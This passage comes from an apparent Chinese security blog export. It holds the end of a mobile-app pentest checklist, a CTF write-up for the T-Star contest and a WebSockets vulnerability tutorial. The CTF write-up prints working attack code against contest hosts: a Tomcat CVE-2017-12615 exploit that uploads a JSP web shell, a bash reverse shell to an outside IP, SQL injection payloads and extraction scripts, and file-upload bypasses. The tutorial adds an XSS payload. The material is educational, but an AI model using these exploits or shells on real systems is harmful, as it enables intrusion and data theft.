<h2 id="5-进程保护"><a href="#5-进程保护" class="headerlink" title="5.进程保护"></a>5.进程保护</h2><h3 id="5-1内存访问和修改"><a href="#5-1内存访问和修改" class="headerlink" title="5.1内存访问和修改"></a>5.1内存访问和修改</h3><p>需要root权限，可以使用MemSpector查看、搜索和修改客户端内存数据，如图所示。用户名密码等数据通常会在/dev/ashmem/dalvik-heap内存段。(目前大多数工具都是通过ptrace接口修改客户端内存，可以使用ptrace机制本身防护。)</p>
<p><img src="https://image.3001.net/images/20200710/15943658745132.png" alt="image-20200710114020175"></p>
<h3 id="5-2动态注入"><a href="#5-2动态注入" class="headerlink" title="5.2动态注入"></a>5.2动态注入</h3><p>​    通过注入动态链接库，hook 客户端某些关键函数，从而获取敏感信息或者改变程序执行。检测 LD_PRELOAD 环境变量。使用 LD_PRELOAD 环境变量，可以让进程预先加载任意 so ，劫持函数。</p>
<h2 id="6-通信安全"><a href="#6-通信安全" class="headerlink" title="6.通信安全"></a>6.通信安全</h2><h3 id="6-1通信加密"><a href="#6-1通信加密" class="headerlink" title="6.1通信加密"></a>6.1通信加密</h3><p>​    如果客户端与服务器之间的通信加密协议实现不当，攻击者将有机会对当前网络环境中其他合法用户的通信内容进行窃听甚至篡改。</p>
<h3 id="6-2证书有效性"><a href="#6-2证书有效性" class="headerlink" title="6.2证书有效性"></a>6.2证书有效性</h3><p>​    主要测试SSL协议安全性、SSL证书验证等。</p>
<h3 id="6-3关键数据加密和校验"><a href="#6-3关键数据加密和校验" class="headerlink" title="6.3关键数据加密和校验"></a>6.3关键数据加密和校验</h3><p>​    测试客户端程序提交数据给服务端时，密码、收款人信息等关键字段是否进行了加密，防止恶意用户嗅探到用户数据包中的密码等敏感信息。</p>
<h3 id="6-4访问控制"><a href="#6-4访问控制" class="headerlink" title="6.4访问控制"></a>6.4访问控制</h3><p>​    测试客户端访问的URL是否仅能由手机客户端访问。是否可以绕过登录限制直接访问登录后才能访问的页面，对需要二次验证的页面(如私密问题验证)，能否绕过验证。</p>
<h3 id="6-5客户端更新安全性"><a href="#6-5客户端更新安全性" class="headerlink" title="6.5客户端更新安全性"></a>6.5客户端更新安全性</h3><p>​    使用代理抓取检测更新的数据包，尝试将服务器返回的更新url替换为恶意链接。看客户端是否会直接打开此链接并下载应用。在应用下载完毕后，测试能否替换下载的apk 文件，测试客户端是否会安装替换后的应用。</p>
<h3 id="6-6短信重放攻击"><a href="#6-6短信重放攻击" class="headerlink" title="6.6短信重放攻击"></a>6.6短信重放攻击</h3><p>​    检测应用中是否存在数据包重放攻击的安全问题。是否会对客户端用户造成短信轰炸的困扰。</p>
<h2 id="7-业务安全"><a href="#7-业务安全" class="headerlink" title="7.业务安全"></a>7.业务安全</h2><h3 id="7-1越权操作"><a href="#7-1越权操作" class="headerlink" title="7.1越权操作"></a>7.1越权操作</h3><p>​    服务器端对客户提出的数据操作请求过分信任，忽略了对该用户操作权限的判定，导致攻击账号拥有了其他账户的增删改查功能。</p>
<h3 id="7-2交易篡改"><a href="#7-2交易篡改" class="headerlink" title="7.2交易篡改"></a>7.2交易篡改</h3><p>​    本项测试主要是修改金额信息(如:转帐金额为负值)，订单信息(如:订单的数量)等</p>
<h3 id="7-3重放攻击"><a href="#7-3重放攻击" class="headerlink" title="7.3重放攻击"></a>7.3重放攻击</h3><p>​    主要就是进行抓包重放(如:重放产品购买、订单创造等)测试。</p>
<h3 id="7-4用户枚举"><a href="#7-4用户枚举" class="headerlink" title="7.4用户枚举"></a>7.4用户枚举</h3><p>​    此类漏洞情境一般是:登录界面无验证码、有明显的返回信息(如:该账号不存在、密码错误等)</p>
<h3 id="7-5暴力破解"><a href="#7-5暴力破解" class="headerlink" title="7.5暴力破解"></a>7.5暴力破解</h3><p>​    主要是测试业务中查询、登录等功能，尝试使用暴力枚举的方式进行破解。</p>
<h3 id="7-6注入-XSS-CSRF"><a href="#7-6注入-XSS-CSRF" class="headerlink" title="7.6注入/XSS/CSRF"></a>7.6注入/XSS/CSRF</h3><p>​    和WEB测试类似，主要测试站点存在的常见的web漏洞。</p>
]]></content>
      <categories>
        <category>APP渗透</category>
      </categories>
      <tags>
        <tag>APP渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>服务器端模板注入（SSTI）</title>
    <url>/2020/08/16/SSTI/</url>
    <content><![CDATA[<p>​    最近做ctf时遇到一个模板注入的题，才想到以前都是直接在网上找payload，并没有仔细研究过ssti。本文从几个方面来细说ssti并应用实例来加深理解。</p>
<p><img src="https://image.3001.net/images/20200815/15974899849103.png" alt="image-20200728151739501"></p>
<a id="more"></a>    

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123; &#125;&#125;</span><br><span class="line">&#123;% %&#125;</span><br></pre></td></tr></table></figure>

<p>​    由于Markdown 文档中的上述标签与 nunjucks 模板引擎的标签发生了冲突。上述标签等这些标签都是模板引擎的占位标签，如果 MarkDown 文档中包含这些标签，那么解析时就会把 MD 文档中的标签动态解析了，于是导致 MD 文档解析时报错。</p>
<p>文章发表在freebuf上，url：<a href="https://www.freebuf.com/articles/web/246832.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/246832.html</a></p>
]]></content>
      <categories>
        <category>SSTI</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>腾讯T-Star高校挑战赛writeup --白给</title>
    <url>/2020/07/05/T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp/</url>
    <content><![CDATA[<p>2020.06.30，参加T-Star高校挑战赛，总共十个题，团队做出来八个，感谢队友带飞。</p>
<p><img src="https://image.3001.net/images/20200820/15979138862144.png" alt="image-20200703143606576"></p>
<a id="more"></a>
<p><img src="https://image.3001.net/images/20200820/15979138893590.png" alt="image-20200703143513478"></p>
<h2 id="1-题目一-签到"><a href="#1-题目一-签到" class="headerlink" title="1.题目一 签到"></a>1.题目一 签到</h2><h3 id="操作内容："><a href="#操作内容：" class="headerlink" title="操作内容："></a>操作内容：</h3><p>上传为前端js的验证，将php一句话后缀改为jpg，上传抓包修改后缀为php，上传成功</p>
<p><img src="https://image.3001.net/images/20200820/15979138931233.jpg" alt="img"> </p>
<p>查看地址</p>
<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5Cwps53F.tmp.jpg" alt="img"> </p>
<p>用菜刀连接，查看flag</p>
<p><img src="https://image.3001.net/images/20200820/15979138965960.jpg" alt="img"> </p>
<h3 id="flag值："><a href="#flag值：" class="headerlink" title="flag值："></a>flag值：</h3><p>key{K735c9f0D7ddc3b9}</p>
<h2 id="2-题目二-命令执行基础"><a href="#2-题目二-命令执行基础" class="headerlink" title="2.题目二 命令执行基础"></a>2.题目二 命令执行基础</h2><h3 id="操作内容：-1"><a href="#操作内容：-1" class="headerlink" title="操作内容："></a>操作内容：</h3><p>用&amp;&amp;不行，采用管道符执行。</p>
<p><img src="https://image.3001.net/images/20200820/1597913899135.png" alt="image-20200703143926169"></p>
<p>执行结果：</p>
<p><img src="https://image.3001.net/images/20200820/15979139024954.png" alt="image-20200703143935690"></p>
<p>通过查看上级目录文件不断查看，找打key文件位置。cat查看内容</p>
<p><img src="https://image.3001.net/images/20200820/15979139049157.png" alt="image-20200703143940672"></p>
<p>查看结果:</p>
<p><img src="https://image.3001.net/images/20200820/15979139063878.png" alt="image-20200703143950416"></p>
<h3 id="flag值：-1"><a href="#flag值：-1" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{usderhky}</p>
<h2 id="3-题目三-你能爆破吗"><a href="#3-题目三-你能爆破吗" class="headerlink" title="3.题目三 你能爆破吗"></a>3.题目三 你能爆破吗</h2><h3 id="操作内容：-2"><a href="#操作内容：-2" class="headerlink" title="操作内容："></a>操作内容：</h3><p>admin admin弱口令登进去，发现回显cookie，可以用cookie注入，cookie为用户名的base64编码，所以还需要把payload进行base64编码<br>首先判断字段数，暴出位置，<br>暴库payload：<br>-admin” union select 1,2,database()#<br>Cookie: uname=LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkj</p>
<p><img src="https://image.3001.net/images/20200820/15979139095751.png" alt="image-20200703144314036"></p>
<p>爆表：<br>-admin” union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#<br>Cookie: uname=LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgd2hlcmUgdGFibGVfc2NoZW1hPWRhdGFiYXNlKCkj</p>
<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5Cimage-20200703144320621.png" alt="image-20200703144320621"></p>
<p>暴字段：<br>-admin” union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’flag’#<br>Cookie: uname=LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9uYW1lPSdmbGFnJyM=</p>
<p><img src="https://image.3001.net/images/20200820/15979139111132.png" alt="image-20200703144332264"></p>
<p>暴值：<br>-admin” union select 1,2,group_concat(flag) from flag#</p>
<p><img src="https://image.3001.net/images/20200820/15979139173893.png" alt="image-20200703144338860"></p>
<h3 id="flag值：-2"><a href="#flag值：-2" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{a405ef895ef46d96}</p>
<h2 id="4-题目四-文件上传"><a href="#4-题目四-文件上传" class="headerlink" title="4.题目四 文件上传"></a>4.题目四 文件上传</h2><h3 id="操作内容：-3"><a href="#操作内容：-3" class="headerlink" title="操作内容："></a>操作内容：</h3><p>上传抓包修改文件后缀，php被过滤不能上传，用pht也可以解析成php，图片内容之后加上php代码查看phpinfo发现被过滤了前面的尖括号、问号和php</p>
<p><img src="https://image.3001.net/images/20200820/15979139201294.png" alt="image-20200703144445977"></p>
<p>使用双写绕过</p>
<p><img src="https://image.3001.net/images/20200820/15979139224640.png" alt="image-20200703144532773"></p>
<p>查看成功解析</p>
<p><img src="https://image.3001.net/images/20200820/15979139251914.png" alt="image-20200703144537190"></p>
<p>构造payload重传，</p>
<p><img src="https://image.3001.net/images/20200820/15979139293979.png" alt="image-20200703144542942"></p>
<p>解析页面传参代码执行得到flag</p>
<p><img src="https://image.3001.net/images/20200820/15979139313873.png" alt="image-20200703144548208"></p>
<h3 id="flag值：-3"><a href="#flag值：-3" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{Aa3c7c37508E40B3}</p>
<h2 id="5-题目五-文件包含GetShell"><a href="#5-题目五-文件包含GetShell" class="headerlink" title="5.题目五 文件包含GetShell"></a>5.题目五 文件包含GetShell</h2><h3 id="操作内容：-4"><a href="#操作内容：-4" class="headerlink" title="操作内容："></a>操作内容：</h3><p>查看源码，发现了lfi.txt，查看lfi.txt，发现可以文件包含，上传只能上传txt类型</p>
<p><img src="https://image.3001.net/images/20200820/15979139353525.png" alt="image-20200703144845841"></p>
<p>把php一句话压缩成zip</p>
<p><img src="https://image.3001.net/images/20200820/15979139375033.png" alt="image-20200703144849819"></p>
<p>压缩之后修改后缀为txt，上传成功</p>
<p><img src="https://image.3001.net/images/20200820/15979139421111.png" alt="image-20200703144857316"></p>
<p>用php伪协议phar://解压进行利用<br><a href="http://c3c85e3a.yunyansec.com/lfi.php?file=phar://files/Z47zIdPkWHq5l5DQ.txt/33" target="_blank" rel="noopener">http://c3c85e3a.yunyansec.com/lfi.php?file=phar://files/Z47zIdPkWHq5l5DQ.txt/33</a><br>菜刀连接找到flag</p>
<p><img src="https://image.3001.net/images/20200820/15979139441963.png" alt="image-20200703144902999"></p>
<p>查看</p>
<p><img src="https://image.3001.net/images/20200820/15979139473868.png" alt="image-20200703144906810"></p>
<h3 id="flag值：-4"><a href="#flag值：-4" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{weisuohenzhongyao}</p>
<h2 id="6-题目六-成绩单"><a href="#6-题目六-成绩单" class="headerlink" title="6.题目六 成绩单"></a>6.题目六 成绩单</h2><h3 id="操作内容：-5"><a href="#操作内容：-5" class="headerlink" title="操作内容："></a>操作内容：</h3><p>post注入，单引号字符型注入，啥都没过滤，写wp就直接用sqlmap跑了。</p>
<p>post抓包得到请求包，保存为1.txt</p>
<p><img src="https://image.3001.net/images/20200820/15979139501457.jpg" alt="img"> </p>
<p>sqlmap一把梭</p>
<p>暴值得到flag：sqlmap.py -r 1.txt -D web1 –level 3 -T fl4g -C flag –dump</p>
<p><img src="https://image.3001.net/images/20200820/15979139557225.jpg" alt="img"> </p>
<h3 id="flag值：-5"><a href="#flag值：-5" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{Sql_INJECT0N_4813drd8hz4}</p>
<h2 id="7-题目七-小猫咪踩灯泡"><a href="#7-题目七-小猫咪踩灯泡" class="headerlink" title="7.题目七 小猫咪踩灯泡"></a>7.题目七 小猫咪踩灯泡</h2><h3 id="操作内容：-6"><a href="#操作内容：-6" class="headerlink" title="操作内容："></a>操作内容：</h3><p>CVE-2017-12615，github找exp，原理是通过上传jsp的脚本来拿到webshell。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def attack(url):</span><br><span class="line">	user_agent&#x3D;&quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;51.0.2704.103 Safari&#x2F;537.36&quot;</span><br><span class="line">	headers&#x3D;&#123;&quot;User-Agent&quot;:user_agent&#125;</span><br><span class="line">	data&#x3D;&quot;&quot;&quot;&lt;%</span><br><span class="line">    if(&quot;fff&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream();</span><br><span class="line">        int a &#x3D; -1;</span><br><span class="line">        byte[] b &#x3D; new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;&#x2F;pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;&quot;&quot;&quot;</span><br><span class="line">	try:</span><br><span class="line">		requests.put(url, headers&#x3D;headers, data&#x3D;data)</span><br><span class="line">		time.sleep(2)</span><br><span class="line">		verify_response &#x3D; requests.get(url[:-1], headers&#x3D;headers)</span><br><span class="line">		if verify_response.status_code &#x3D;&#x3D; 200:</span><br><span class="line">			print &#39;success!&#39;</span><br><span class="line">		else :</span><br><span class="line">			print verify_response.status_code</span><br><span class="line">	except :</span><br><span class="line">		&quot;error&quot;</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">	target_url &#x3D; sys.argv[1] + &#39;2017126151.jsp&#x2F;&#39;</span><br><span class="line">	attack(target_url)</span><br><span class="line">	print &#39;shell: &#39; + target_url[:-1]</span><br></pre></td></tr></table></figure>

<p>运行脚本，上传shell，得到shell位置，提交参数查询得到flag</p>
<p><a href="http://31a9f418.yunyansec.com/2017126151.jsp?pwd=fff&amp;cmd=cat%20flag.txt" target="_blank" rel="noopener">http://31a9f418.yunyansec.com/2017126151.jsp?pwd=fff&amp;cmd=cat%20flag.txt</a></p>
<p><img src="https://image.3001.net/images/20200820/15979139603769.png" alt="image-20200703145708208"></p>
<h3 id="flag值：-6"><a href="#flag值：-6" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{54e47be053bf6ea1}</p>
<h2 id="8-题目八-分析代码获得flag"><a href="#8-题目八-分析代码获得flag" class="headerlink" title="8.题目八 分析代码获得flag"></a>8.题目八 分析代码获得flag</h2><h3 id="操作内容：-7"><a href="#操作内容：-7" class="headerlink" title="操作内容："></a>操作内容：</h3><p>运行脚本文件，写入payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import sleep</span><br><span class="line">from urllib.parse import quote</span><br><span class="line"></span><br><span class="line">payload &#x3D; [</span><br><span class="line">    &#39;&gt;ls\\&#39;, </span><br><span class="line">    &#39;ls&gt;_&#39;, </span><br><span class="line">    &#39;&gt;\ \\&#39;, </span><br><span class="line">    &#39;&gt;-t\\&#39;, </span><br><span class="line">    &#39;&gt;\&gt;g&#39;, </span><br><span class="line">    &#39;ls&gt;&gt;_&#39;, </span><br><span class="line"></span><br><span class="line">    &#39;&gt;sh&#39;, </span><br><span class="line">    &#39;&gt;ba\\&#39;, </span><br><span class="line">    &#39;&gt;\|\\&#39;,</span><br><span class="line">    &#39;&gt;32\\&#39;,</span><br><span class="line">    &#39;&gt;1.\\&#39;,</span><br><span class="line">    &#39;&gt;5\\&#39;, </span><br><span class="line">    &#39;&gt;2.\\&#39;,</span><br><span class="line">    &#39;&gt;10\\&#39;, </span><br><span class="line">    &#39;&gt;9.\\&#39;, </span><br><span class="line">    &#39;&gt;3\\&#39;, </span><br><span class="line">    &#39;&gt;\ \\&#39;, </span><br><span class="line">    &#39;&gt;rl\\&#39;, </span><br><span class="line">    &#39;&gt;cu\\&#39;, </span><br><span class="line"></span><br><span class="line">    # exec</span><br><span class="line">    &#39;sh _&#39;, </span><br><span class="line">    &#39;sh g&#39;, </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;82da9c13.yunyansec.com&#x2F;?reset&#x3D;1&#39;)</span><br><span class="line">for i in payload:</span><br><span class="line">    assert len(i) &lt;&#x3D; 5 </span><br><span class="line">    r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;82da9c13.yunyansec.com&#x2F;?1&#x3D;&#39; + quote(i) )</span><br><span class="line">    print(i)</span><br><span class="line">    sleep(0.2)</span><br></pre></td></tr></table></figure>

<p>服务器配置，在index.php中写入脚本<br>bash -i &gt;&amp; /dev/tcp/39.105.51.32/8080 0&gt;&amp;1<br>nc监听，运行脚本，反弹shell<br>nc -lvvp 8080<br>终端中查看文件内容得到flag<br>flag{a1c8BFF2}</p>
<p>之后看第一名战队的wp，还可以用cat读取上级目录中的文件内容来获取flag</p>
<p><img src="https://image.3001.net/images/20200820/15979139665019.png" alt="image-20200703151818734"></p>
<h3 id="flag值：-7"><a href="#flag值：-7" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{a1c8BFF2}</p>
<h2 id="9-SQL注入1"><a href="#9-SQL注入1" class="headerlink" title="9.SQL注入1"></a>9.SQL注入1</h2><p>群里大佬提出是limit注入写文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INTO OUTFILE &#39;物理路径&#39; lines terminated by  （一句话hex编码）</span><br><span class="line">INTO OUTFILE &#39;物理路径&#39; fields terminated by （一句话hex编码）</span><br><span class="line">INTO OUTFILE &#39;物理路径&#39; columns terminated by （一句话hex编码）</span><br><span class="line">INTO OUTFILE &#39;物理路径&#39; lines starting by    （一句话hex编码）</span><br></pre></td></tr></table></figure>

<p>前提：开启secure-file-priv以及有写的权限就可以进行limit写shell</p>
<h2 id="10-SQL注入2"><a href="#10-SQL注入2" class="headerlink" title="10.SQL注入2"></a>10.SQL注入2</h2><p>御剑扫wwwroot.zip，过滤方法中看到过滤的比较凶。赛后通过第一名战队的wp来看，应该是异或注入。猜测账号密码图片都在同一个数据库表中。通过poc猜解出password的hash。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">a &#x3D;[&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;]</span><br><span class="line">temp &#x3D; &#39;&#39;</span><br><span class="line">while(1):</span><br><span class="line">    for i in a:</span><br><span class="line">        url &#x3D; &#39;http:&#x2F;&#x2F;23dcf1dc.yunyansec.com&#x2F;picture.php?id&#x3D;3&quot; or password REGEXP &#39;+&#39;\&#39;^&#39;+temp+i+&#39;\&#39; %23&#39;</span><br><span class="line">        r &#x3D; requests.get(url)</span><br><span class="line">        if &#39;not found&#39; not in r.text:</span><br><span class="line">            temp &#x3D; temp+i</span><br><span class="line">            print (temp)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200820/15979139726157.png" alt="image-20200703152040620"></p>
<p>二十位的hash，可能为dedecms，然后去掉前三位跟后一位然后md5解密得到密码，登录拿到flag。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">详细sql1解法，第一名战队的wp：https:&#x2F;&#x2F;0xfire.me&#x2F;2020&#x2F;06&#x2F;30&#x2F;T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B&#x2F;</span><br><span class="line">github中也有SQL1的解题方法：https:&#x2F;&#x2F;github.com&#x2F;XDSEC&#x2F;xdsec_ctf&#x2F;tree&#x2F;494b53d388186e8be21e753bb2048362842280c1&#x2F;xdctf2015&#x2F;izyCTF</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>T-Star高校挑战赛</tag>
      </tags>
  </entry>
  <entry>
    <title>WebSockets安全漏洞</title>
    <url>/2020/10/20/WebSockets%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="WebSockets安全漏洞"><a href="#WebSockets安全漏洞" class="headerlink" title="WebSockets安全漏洞"></a>WebSockets安全漏洞</h1><h2 id="1-WebSockets"><a href="#1-WebSockets" class="headerlink" title="1. WebSockets"></a>1. WebSockets</h2><p>WebSockets广泛用于现代Web应用程序中。它们通过HTTP发起，并通过双向双向通信提供长期连接。</p>
<p>WebSocket用于各种目的，包括执行用户操作和传输敏感信息。几乎与常规HTTP一起出现的任何Web安全漏洞也可能与WebSockets通信有关。</p>
<p><img src="https://image.3001.net/images/20201018/16030254226387.png" alt="image-20201016085345616"></p>
<a id="more"></a>

<h2 id="2-HTTP和WebSockets有什么区别？"><a href="#2-HTTP和WebSockets有什么区别？" class="headerlink" title="2. HTTP和WebSockets有什么区别？"></a>2. HTTP和WebSockets有什么区别？</h2><p>Web浏览器和网站之间的大多数通信使用HTTP。使用HTTP，客户端发送请求，服务器返回响应。通常，响应立即发生，并且事务完成。即使网络连接保持打开状态，这也将用于请求和响应的单独事务。</p>
<p>一些现代网站使用WebSockets。WebSocket连接是通过HTTP发起的，通常是长期存在的。消息可以随时向任一方向发送，并且本质上不是事务性的。在客户端或服务器准备发送消息之前，连接通常将保持打开和空闲状态。</p>
<p>WebSocket在需要低延迟或服务器启动消息的情况下（例如财务数据的实时提要）特别有用。</p>
<h2 id="3-如何建立WebSocket连接？"><a href="#3-如何建立WebSocket连接？" class="headerlink" title="3. 如何建立WebSocket连接？"></a>3. 如何建立WebSocket连接？</h2><p>WebSocket连接通常是使用客户端JavaScript创建的，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var ws &#x3D; new WebSocket(&quot;wss:&#x2F;&#x2F;normal-website.com&#x2F;chat&quot;);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意</p>
<p>该<code>wss</code>协议建立在一个加密的TLS连接的WebSocket，而<code>ws</code>协议使用未加密的连接。</p>
</blockquote>
<p>为了建立连接，浏览器和服务器通过HTTP执行WebSocket握手。浏览器发出WebSocket握手请求，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;chat HTTP&#x2F;1.1</span><br><span class="line">Host: normal-website.com</span><br><span class="line">Sec-WebSocket-Version: 13</span><br><span class="line">Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w&#x3D;&#x3D;</span><br><span class="line">Connection: keep-alive, Upgrade</span><br><span class="line">Cookie: session&#x3D;KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2</span><br><span class="line">Upgrade: websocket</span><br></pre></td></tr></table></figure>

<p>如果服务器接受连接，则它将返回WebSocket握手响应，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 101 Switching Protocols</span><br><span class="line">Connection: Upgrade</span><br><span class="line">Upgrade: websocket</span><br><span class="line">Sec-WebSocket-Accept: 0FFP+2nmNIf&#x2F;h+4BP36k9uzrYGk&#x3D;</span><br></pre></td></tr></table></figure>

<p>此时，网络连接保持打开状态，并且可以用于向任一方向发送WebSocket消息。</p>
<blockquote>
<p>注意</p>
<p>WebSocket握手消息的几个功能值得注意：</p>
<ul>
<li>请求和响应中 的<code>Connection</code>和<code>Upgrade</code>标头表示这是WebSocket握手。</li>
<li>请求头的<code>Sec-WebSocket-Version</code>指定WebSocket协议版本的客户端希望使用。通常是这样<code>13</code>。</li>
<li>请求头的<code>Sec-WebSocket-Key</code>包含Base64编码的随机值，这应该在每个握手请求是随机产生的。</li>
<li>响应头的<code>Sec-WebSocket-Accept</code>包含在提交的值的散列<code>Sec-WebSocket-Key</code>请求头，具有在协议规范中定义的特定的字符串串联。这样做是为了防止由于服务器配置错误或代 理缓存错误而引起的误导响应。</li>
</ul>
</blockquote>
<h2 id="4-WebSocket消息是什么样的？"><a href="#4-WebSocket消息是什么样的？" class="headerlink" title="4. WebSocket消息是什么样的？"></a>4. WebSocket消息是什么样的？</h2><p>建立WebSocket连接后，客户端或服务器可以在任一方向上异步发送消息。</p>
<p>可以使用客户端JavaScript从浏览器发送一条简单消息，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ws.send(&quot;Peter Wiener&quot;);</span><br></pre></td></tr></table></figure>

<p>原则上，WebSocket消息可以包含任何内容或数据格式。在现代应用程序中，JSON通常用于在WebSocket消息中发送结构化数据。</p>
<p>例如，使用WebSockets的聊天机器人应用程序可能会发送如下消息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;user&quot;:&quot;Hal Pline&quot;,&quot;content&quot;:&quot;I wanted to be a Playstation growing up, not a device to answer your inane questions&quot;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="5-WebSockets安全漏洞"><a href="#5-WebSockets安全漏洞" class="headerlink" title="5. WebSockets安全漏洞"></a>5. WebSockets安全漏洞</h2><p>原则上，实际上与WebSockets有关的任何Web安全漏洞都可能出现：</p>
<ul>
<li>传输到服务器的用户提供的输入可能会以不安全的方式进行处理，从而导致漏洞，例如SQL注入或XML外部实体注入。</li>
<li>通过WebSockets达到的某些盲目漏洞可能仅使用带外（OAST）技术才能检测到。</li>
<li>如果攻击者控制的数据通过WebSockets传输到其他应用程序用户，则可能导致XSS或其他客户端漏洞。</li>
</ul>
<h3 id="5-1-处理WebSocket消息以利用漏洞"><a href="#5-1-处理WebSocket消息以利用漏洞" class="headerlink" title="5.1 处理WebSocket消息以利用漏洞"></a>5.1 处理WebSocket消息以利用漏洞</h3><p>可以通过篡改WebSocket消息的内容来发现和利用影响WebSocket的大多数基于输入的漏洞。</p>
<p>例如，假设聊天应用程序使用WebSockets在浏览器和服务器之间发送聊天消息。用户键入聊天消息时，将向服务器发送如下所示的WebSocket消息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;message&quot;:&quot;Hello Carlos&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>消息的内容（再次通过WebSockets）传输到另一个聊天用户，并在用户的浏览器中呈现，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;td&gt;Hello Carlos&lt;&#x2F;td&gt;</span><br></pre></td></tr></table></figure>

<p>在这种情况下，只要没有其他输入处理或防御措施在起作用，攻击者就可以通过提交以下WebSocket消息来执行概念验证XSS攻击：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;message&quot;:&quot;&lt;img src&#x3D;1 onerror&#x3D;&#39;alert(1)&#39;&gt;&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>靶场url：<a href="https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities" target="_blank" rel="noopener">https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities</a></p>
<p>复现详情：</p>
<p>首页存在实时聊天功能，对话框直接插入xss，抓包修改：</p>
<p><img src="https://image.3001.net/images/20201018/16030254489930.png" alt="image-20201016234300384"></p>
<p>修改为：</p>
<p><img src="https://image.3001.net/images/20201018/16030254508473.png" alt="image-20201016234321766"></p>
<p>可以看到payload已成功插入：</p>
<p><img src="https://image.3001.net/images/20201018/16030254533623.png" alt="image-20201016234448709"></p>
<p>成功弹窗：</p>
<p><img src="https://image.3001.net/images/20201018/16030254567741.png" alt="image-20201016234509914"></p>
